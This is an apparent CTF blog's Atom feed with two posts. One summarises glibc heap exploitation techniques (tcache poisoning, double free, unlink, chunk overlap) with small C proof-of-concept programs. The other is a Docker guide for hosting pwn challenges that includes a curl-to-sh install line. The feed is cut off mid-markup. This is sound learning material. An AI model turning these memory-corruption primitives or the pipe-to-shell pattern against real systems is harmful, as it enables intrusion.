<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>zhz&#39;blog</title>
  
  <subtitle>记录一些东西</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-04-29T12:17:55.068Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>zhz</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>堆攻击手段整理总结</title>
    <link href="http://yoursite.com/2020/04/15/%E5%A0%86%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5%E6%95%B4%E7%90%86%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/04/15/%E5%A0%86%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5%E6%95%B4%E7%90%86%E6%80%BB%E7%BB%93/</id>
    <published>2020-04-15T00:41:59.000Z</published>
    <updated>2020-04-29T12:17:55.068Z</updated>
    
    <content type="html"><![CDATA[<p>算是对自己掌握的知识做一个总结吧。毕竟憨憨，经常脑子犯浑，自己把自己绕进去了。就趁着清醒的时候对于手法，原理进行一个记录吧。(慢慢✍吧，我也不知道多久能写完，懒癌选手)</p><h2 id="Tcache-bin"><a href="#Tcache-bin" class="headerlink" title="Tcache_bin"></a>Tcache_bin</h2><p>tcache在free中并不会被清除inuse标志，所以他们被认为是处于使用状态，不会被合并，LIFO</p><h3 id="某要点"><a href="#某要点" class="headerlink" title="某要点"></a>某要点</h3><p>这里也点出一点和fastbin的malloc机制所不同的地方</p><p>首先来看tcache bin的malloc机制</p><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5C%E5%A0%86%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5%E6%95%B4%E7%90%86%E6%80%BB%E7%BB%93%5Cimage-20200424223103869.png" alt="image-20200424223103869"></p><p>计算对应的size是否在bin中存在chunk，tcache是否初始化。malloc不存在对size的检测。</p><p><code>fastbin</code>的malloc机制主要看这一段</p><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5C%E5%A0%86%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5%E6%95%B4%E7%90%86%E6%80%BB%E7%BB%93%5Cimage-20200424223524506.png" alt="image-20200424223524506"></p><p>会对malloc的chunk的size位与fast bin中chunk的size位进行检测，是否匹配。</p><p>照我理解，就是malloc(0x28)的时候，会对这个malloc里的size进行fastbin中chunk获取，获取完后会进行这里的第一重检测，也就是实际chunk中的size与fastbin中取出的chunk的size进行匹配。因为这一重检测，所以我们打malloc_hook的时候经常会-0x23这种操作，来使得size匹配。</p><h3 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h3><p>因为tcache bin检查机制的问题，可以前后两次free同一个堆块，检查机制并不会报错。也就是常说的double free技巧。</p><p>这种条件适用的前提是存在一个UAF漏洞！或者也可以进行双指针同时指向同一个堆块！</p><p>因为double free 是任意地址写的一种技巧，指堆上的某块内存被释放后，并没有将指向该堆块的指针清零，那么，我们就可以利用程序的其他部分对该内存进行再次的free。</p><h3 id="tcache-House-of-Spirit"><a href="#tcache-House-of-Spirit" class="headerlink" title="tcache House of Spirit"></a>tcache House of Spirit</h3><p>这种手法和fatsbin的House of Spirit很类似。这点我在fastbin的攻击手段中讲述的比较详细了，这里就简要概括一下。</p><p>可以说也是一种任意地址写的手段，不过得先在你想要的地方伪造堆块，并控制堆指针指向伪造堆块的mem域，将其释放，再次malloc一个相同大小的堆块就可以达成任意地址写。</p><p>fastbin里面这种手法你需要对下一个区域进行堆块伪造(主要是写入正确的size位)，而在tcache bin中，你就不需要进行下一个堆块的伪造。</p><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h3><p>也就是常见的修改tcachebin chunk的fd域，实现任意地址写。</p><p>这个我寻思，经常和tcache dup配合，double free后，进行fd修改，两种攻击组合，形成任意地址写。</p><h3 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h3><p>每个线程通过一个tcache_perthread_struct线程本地变量保存tcache bin以及相关的chunk计数。如果我们能够修改tcache_perthread_struct这个结构体的内容，就可以完全控制malloc的内存分配。</p><p>那么如何获得这个地址，并控制他呢？我们来了解下tcache的初始化过程，MAYBE_INIT_TCACHE这个宏，他在没有初始化tcache的情况下会初始化一个tcache，实际上初始化tcache的工作是由内部函数tcache_init完成的<br>###tcache_init<br>static void<br>tcache_init(void)<br>{<br>mstate ar_ptr;<br>void *victim = 0;<br>const size_t bytes = sizeof (tcache_perthread_struct);<br>也就是说，tcache_perthread_struct应该保存在堆区的底部，因为他是最先分配的内存空间。它的结构体中保存着0x20-0x90bin中chunk的数量和信息。如果我们将tcache_perthread_struct中bin的信息全部改为0707070707070707也就代表了tcache bin全部被我们填满，接下来的chunk就会free进fast or unsorted里面。</p><h3 id="glibc-2-29里的tcache-bin"><a href="#glibc-2-29里的tcache-bin" class="headerlink" title="glibc 2.29里的tcache bin"></a>glibc 2.29里的tcache bin</h3><p>简单来说，新增了一个指针key放在bk位置，当chunk被free放入tcache时，key会被写入<code>tcache_perthread_struct</code>的地址。chunk被取出时，key会被清空。</p><p>在free时，存在一重检测，会检测key是否为<code>tcache_perthread_struct</code>的地址，然后遍历tcache，检测该chunk是否已经在tcache里。</p><p>也就是:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e-key == &amp;tcache_perthread_struct &amp;&amp; chunk in tcachebin[chunk_idx]</span><br></pre></td></tr></table></figure><p>由此产生的思路:(抄某爷爷的，地址在这:<a href="https://www.secshi.com/39809.html" target="_blank" rel="noopener">https://www.secshi.com/39809.html</a>)</p><ol><li>如果有UAF漏洞或堆溢出，可以修改<code>e-&gt;key</code>为空，或者其他非<code>tcache_perthread_struct</code>的地址。这样可以直接绕过<code>_int_free</code>里面第一个if判断。不过如果UAF或堆溢出能直接修改chunk的fd的话，根本就不需要用到double free了。</li><li>利用堆溢出，修改chunk的size，最差的情况至少要做到off by null。留意到<code>_int_free</code>里面判断当前chunk是否已存在tcache的地方，它是根据chunk的大小去查指定的tcache链，由于我们修改了chunk的size，查找tcache链时并不会找到该chunk，满足free的条件。虽然double free的chunk不在同一个tcache链中，不过不影响我们使用tcache poisoning进行攻击。</li></ol><h3 id="关于tcache下对于main-arena泄露的一些个人见解"><a href="#关于tcache下对于main-arena泄露的一些个人见解" class="headerlink" title="关于tcache下对于main_arena泄露的一些个人见解"></a>关于tcache下对于main_arena泄露的一些个人见解</h3><p>手法一:</p><h4 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><h4 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS]; </span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><ul><li><code>tcache_prethread_struct</code> 是整个 tcache 的管理结构，其中有 64 项 entries。每个 entries 管理了若干个大小相同的 chunk，用单向链表 (<code>tcache_entry</code>) 的方式连接释放的 chunk，这一点上和 fastbin 很像</li><li>每个 thread 都会维护一个 <code>tcache_prethread_struct</code></li><li><code>tcache_prethread_struct</code> 中的 <code>counts</code> 记录 <code>entries</code> 中每一条链上 chunk 的数目，每条链上最多可以有 7 个 chunk</li><li><code>tcache_entry</code>用于链接 chunk 结构体，其中的<code>next</code>指针指向下一个大小相同的 chunk<ul><li>这里与 fastbin 不同的是 fastbin 的 fd 指向 chunk 开头的地址，而 tcache 的 next 指向 user data 的地方，即 chunk header 之后</li></ul></li></ul><p>问题呢，就在<code>tcache_entry</code>这里，众所周知，我们进行常规的tcache duping + tcache poisoning操作时，会对同一个chunk free两次，并malloc相同大小的chunk 三次，以此达到任意地址写的目的。</p><p>那么有没有想过，你free两次，entries[]里面只记录了两次，也就是entries[2]，你malloc一次，entries[]中的数字就-1，那么你第三次malloc的时候，entries[]就变成了entries[-1]，可能很多人看到这个-1就明白过来了。</p><p>是的，这个size的tcache bin被你溢出了。那么下次，你再次free 相同size的chunk时，tcache bin中这个size大小的entries[]就会认为本bin已经被填满，chunk就会根据size落入fastbin或者unsortedbin。</p><p>此时，根据uaf漏洞，就可以show出main_arena。(如果允许malloc的size小于0x80，那么就拿不到main_arena)</p><p>手法二:</p><p>当然，如果malloc的size小于0x80，也是基于uaf漏洞的话，还有另外一种方法。</p><p>在double free后，因为是单链表结构，bin中chunk的fd会储存下一个chunk的位置信息，double free，也就是把自己的地址写入了fd。如果存在uaf，自然可以在double free后，直接show本堆块，泄露地址。这样，通过uaf漏洞实现任意地址写，讲堆块的size位进行修改，改成大于0x400，free后落入unsortedbin，从而泄露main_arena。</p><h2 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h2><h3 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h3><p>在利用申请一次largebin大小的堆会将fastbin的堆进行合并进入unsortedbin中，这种打法据我所知，一般配合scanf来达成(因为憨憨也只见过配合scanf的)</p><p>利用这种特性，可以达成fastbin的doublefree</p><p>这里是poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"><span class="keyword">int</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line">read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line">read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="大名鼎鼎unlink"><a href="#大名鼎鼎unlink" class="headerlink" title="大名鼎鼎unlink"></a>大名鼎鼎unlink</h2><p>网上有很多教程，我也就简略点一点自己在学习unlink时遇到的困难</p><p>先说利用前提，存在溢出漏洞</p><p>unlink实现手段:</p><p>前向合并，在chunk1种fake chunk，fake chunk的fd 和bk分别设置为ptr-0x18和ptr-0x10(64位)</p><p>32位是ptr - 12 ,ptr-8</p><p>修改chunk2 head的prev_size为fake chunk size以及chunk2 的prev_inuse位 置0,free chunk2</p><p>这样，最终结果，ptr就指向ptr-0x18的地方。</p><p>此时，我们就达成了我们所想要的任意地址写，怎么理解呢，我们来看一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * target = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">init();</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr1 = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr2 = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr3 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">target = ptr1;</span><br><span class="line">ptr1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">ptr1[<span class="number">1</span>] = <span class="number">0x81</span>;</span><br><span class="line">ptr1[<span class="number">2</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;target) - <span class="number">0x18</span>;</span><br><span class="line">ptr1[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;target) - <span class="number">0x10</span>;</span><br><span class="line">ptr2[<span class="number">-2</span>] = <span class="number">0x80</span>;</span><br><span class="line">ptr2[<span class="number">-1</span>] = <span class="number">0x90</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"target = %p before free\n"</span>,target);</span><br><span class="line"><span class="built_in">free</span>(ptr2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"target = %p after free\n"</span>,target);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"pid = %d\n"</span>,getpid());</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="number">0x80e010</span> before <span class="built_in">free</span>  <span class="comment">//这里是运行结果</span></span><br><span class="line">target = <span class="number">0x601078</span> after <span class="built_in">free</span></span><br><span class="line">pid = <span class="number">49521</span></span><br></pre></td></tr></table></figure><p>ptr这个指针原本指向的是堆块的地址，但是经过我们的unlink之后，ptr指针就指向了自身地址-0x18的地方，也就是上述所表示的ptr=ptr-0x18。</p><p>那么，我们就获得了两个相同的指针。一个指针存在于原本的ptr地址里，另一个就是我们现在控制的chunk指针。</p><p>此时，我们修改fake_chunk[3]为要写的地址(也就是上面所见的chunk0[3]) ，因为fake_chunk[3]是一个指针，我们将其进行修改，指向新地址就代表着我们将新地址的内容作为了我们fake_chunk的内容，此时再修改fake_chunk[0] (也就是修改我们新地址的内容) 即达成了一次任意地址写~</p><p>后向合并</p><p>此时检查chunk1的下下个chunk的flag位，那么此时就在chunk2 faka chunk，并且将chunk3的prev_inuse位 置0，</p><h2 id="堆重叠"><a href="#堆重叠" class="headerlink" title="堆重叠"></a>堆重叠</h2><p>堆重叠，顾名思义，就是两个堆指针同时指向同一个chunk。这里借助一下unlink操作实现。</p><p>poc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * target = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">init();</span><br><span class="line"><span class="keyword">int</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr2 = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">target = ptr1;</span><br><span class="line"><span class="built_in">free</span>(ptr2);</span><br><span class="line">ptr2[<span class="number">-1</span>] = <span class="number">0x210</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr5 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line"><span class="built_in">free</span>(ptr4);</span><br><span class="line"><span class="built_in">free</span>(ptr3);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr6 = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里，ptr6就包含了ptr2+ptr3，而ptr2中ptr5指针就被预留。</p><p>要想实现需要达成两个条件，假设有chunk1,2,3。</p><p>一是chunk3的prev_inuse为0，chunk3的prev_size为chunk1+chunk2</p><p>二是chunk2的prev_size为chunk1。</p><p>检测是这样的，在free chunk3时根据prev_size以为前面有chunk1+chunk2大小的chunk，找到chunk1，找到chunk2的prev_size，符合，unlink。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;算是对自己掌握的知识做一个总结吧。毕竟憨憨，经常脑子犯浑，自己把自己绕进去了。就趁着清醒的时候对于手法，原理进行一个记录吧。(慢慢✍吧，我也不知道多久能写完，懒癌选手)&lt;/p&gt;
&lt;h2 id=&quot;Tcache-bin&quot;&gt;&lt;a href=&quot;#Tcache-bin&quot; class=
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>docker的搭建</title>
    <link href="http://yoursite.com/2020/03/22/docker%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>http://yoursite.com/2020/03/22/docker%E7%9A%84%E6%90%AD%E5%BB%BA/</id>
    <published>2020-03-22T01:00:05.000Z</published>
    <updated>2020-04-03T04:36:01.126Z</updated>
    
    <content type="html"><![CDATA[<h3 id="正常的docker安装"><a href="#正常的docker安装" class="headerlink" title="正常的docker安装"></a>正常的docker安装</h3><p>由于apt官方库里的docker版本可能比较旧，所以先卸载可能存在的旧版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get remove docker docker-engine docker-ce docker.io</span><br></pre></td></tr></table></figure><p>更新apt包索引：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure><p>安装以下包以使apt可以通过HTTPS使用存储库（repository）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common</span><br></pre></td></tr></table></figure><p>添加Docker官方的GPG密钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>使用下面的命令来设置stable存储库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo add-apt-repository <span class="string">"deb [arch=amd64] https://download.docker.com/linux/ubuntu <span class="variable">$(lsb_release -cs)</span> stable"</span></span><br></pre></td></tr></table></figure><p>再更新一下apt包索引：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure><p>安装最新版本的Docker CE：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install -y docker-ce</span><br></pre></td></tr></table></figure><p>启动docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker start</span><br></pre></td></tr></table></figure><p>用hello world进行验证是否成功启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure><h3 id="linux环境下pwn题的搭建"><a href="#linux环境下pwn题的搭建" class="headerlink" title="linux环境下pwn题的搭建"></a>linux环境下pwn题的搭建</h3><p>这里运用到pwn_deploy_chroot。</p><p><a href="https://github.com/giantbranch/pwn_deploy_chroot" target="_blank" rel="noopener">https://github.com/giantbranch/pwn_deploy_chroot</a> &lt;–这里</p><p>运用这个就可以不用上述繁琐操作，从零开始快速布置你的pwn题</p><h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装docker</span></span><br><span class="line">curl ``-``s https:``/``/``get.docker.com``/` `| sh</span><br><span class="line"><span class="comment"># 安装 docker compose 和git</span></span><br><span class="line">apt install docker``-``compose git</span><br><span class="line"><span class="comment"># 下载</span></span><br><span class="line">git <span class="built_in">clone</span> https:``/``/``github.com``/``giantbranch``/``pwn_deploy_chroot.git</span><br></pre></td></tr></table></figure><p>记得先给docker换源！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$vim</span> /etc/docker/daemon.json</span><br><span class="line"><span class="comment">#输入以下内容</span></span><br><span class="line">&#123; </span><br><span class="line"></span><br><span class="line"><span class="string">"registry-mirrors"</span>: [<span class="string">"https://docker.mirrors.ustc.edu.cn"</span>] </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更改镜像后重启docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#systemctl restart docker</span></span><br></pre></td></tr></table></figure><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><ol><li>将所有pwn题目放入bin目录，可以1个，也可以n个（注意名字不带特殊字符，因为会将文件名作为linux用户名）</li><li>python initialize.py</li><li>docker-compose up –build -d</li></ol><h5 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h5><p>1.此时可能会在第三步因为dockerfile里面的设置问题，导致源没换成功。此时就手动修改dockerfile内容，加入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RUN  sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">RUN  apt-get clean</span><br><span class="line"></span><br><span class="line">RUN apt-get update</span><br></pre></td></tr></table></figure><p>2.它会自动部署pwn题，端口默认从10000依次增加。<br>因为某xx要求端口是9999，所以我们要修改一下config.py,把这里的10000改成9999，然后把用的pwn放到bin里</p><p>3.要想修改flag，就在第二步python initialize.py后修改flag.txt，再运行一次python initialize.py</p><p>ok，此时pwn题已部署完毕。此时就可以到image去查看一番。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看当前运行的容器，找到对应的CONTAINER ID后进入</span></span><br><span class="line">sudo docker ps</span><br><span class="line">sudo docker <span class="built_in">exec</span> -ti &lt;CONTAINER ID&gt; bash</span><br></pre></td></tr></table></figure><p>查看容器的ip,用nc连</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/hosts</span><br></pre></td></tr></table></figure><p>最后就是用你的exp进行测试。</p><h3 id="docker镜像的保存和导出"><a href="#docker镜像的保存和导出" class="headerlink" title="docker镜像的保存和导出"></a>docker镜像的保存和导出</h3><p>1.查看要要保存的镜像的ID</p><p>docker  images</p><p><img src="D:%5Cblog%5CHexo%5Csource_posts%5Cdocker%E7%9A%84%E6%90%AD%E5%BB%BA%5Cimage-20200403110914281.png" alt="image-20200403110914281"></p><p>2.保存镜像为tar包</p><p>docker save  -o  gitlab.tar  <repository></repository></p><p>3.用scp，xftp等等将已经压缩好的gitlab.tar包弄到服务器，虚拟机（你想弄到的地方）</p><p>4.将gitlab.tar包导出到本地来(一定要有docker的运行环境，docker安装：<a href="https://www.jianshu.com/p/9c96ea8e6f41" target="_blank" rel="noopener">https://www.jianshu.com/p/9c96ea8e6f41</a>)</p><p>docker  load  -i  gitlab.tar</p><p>5.运行docker容器</p><p>docker  run</p><h3 id="删除docker容器"><a href="#删除docker容器" class="headerlink" title="删除docker容器"></a>删除docker容器</h3><p>1.列出所有容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p>2.停止容器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 